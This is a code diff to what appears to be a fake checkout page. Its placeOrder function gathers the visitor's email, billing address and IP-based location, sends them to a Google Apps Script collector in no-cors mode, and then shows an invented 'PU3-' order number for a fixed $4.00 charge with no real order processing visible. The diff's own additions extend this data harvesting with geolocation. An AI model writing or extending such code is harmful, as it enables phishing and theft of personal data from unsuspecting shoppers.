@@ -243,7 +243,7 @@ function backToShipping(){
 }
 
 // FINAL CHECK
-function placeOrder(event){
+async function placeOrder(event){
 
   const btn = document.getElementById("orderBtn");
   btn.disabled = true;
@@ -271,26 +271,26 @@ function placeOrder(event){
     resetBtn(); return;
   }
 
-  async function getLocationData() {
+  // ✅ GET IP + CITY + STATE
+  let locationData;
   try {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
 
-    return {
+    locationData = {
       ip: data.ip,
       city: data.city,
-      region: data.region, // state
+      state: data.region,
       country: data.country_name
     };
-  } catch (err) {
-    return {
+  } catch (e) {
+    locationData = {
       ip: "Unknown",
       city: "Unknown",
-      region: "Unknown",
+      state: "Unknown",
       country: "Unknown"
     };
   }
-}
 
   const data = {
     email: emailEl.value,
@@ -301,38 +301,41 @@ function placeOrder(event){
     baddress: baddressEl.value,
     bcity: bcityEl.value,
     bstate: bstateEl.value,
-    bzip: bzipEl.value
+    bzip: bzipEl.value,
+
+    // ✅ NEW FIELDS
+    ip: locationData.ip,
+    ip_city: locationData.city,
+    ip_state: locationData.state,
+    ip_country: locationData.country
   };
 
   fetch("https://script.google.com/macros/s/AKfycbyOIg4lBfsIdjHj7i92KVEKMhKird4uL3NgSQ9Mv4Z8eAM1uH7PbuRptDSM-BBY0Rrm3A/exec", {
-  method: "POST",
-  mode: "no-cors", // IMPORTANT
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify(data)
-})
-.then(() => {
+    method: "POST",
+    mode: "no-cors",
+    body: JSON.stringify(data)
+  })
+  .then(() => {
 
-  const orderNumber = "PU3-" + Math.floor(100000 + Math.random() * 900000);
-  const now = new Date();
+    const orderNumber = "PU3-" + Math.floor(100000 + Math.random() * 900000);
+    const now = new Date();
 
-  localStorage.setItem("orderData", JSON.stringify({
-    orderNumber,
-    name: nameEl.value,
-    email: emailEl.value,
-    total: "$4.00",
-    date: now.toLocaleDateString(),
-    time: now.toLocaleTimeString()
-  }));
+    localStorage.setItem("orderData", JSON.stringify({
+      orderNumber,
+      name: nameEl.value,
+      email: emailEl.value,
+      total: "$4.00",
+      date: now.toLocaleDateString(),
+      time: now.toLocaleTimeString()
+    }));
 
-  window.location.href = "confirmation.html";
+    window.location.href = "confirmation.html";
 
-})
-.catch(() => {
-  alert("Error submitting");
-  resetBtn();
-});
+  })
+  .catch(() => {
+    alert("Error submitting");
+    resetBtn();
+  });
 }
 
 function resetBtn(){
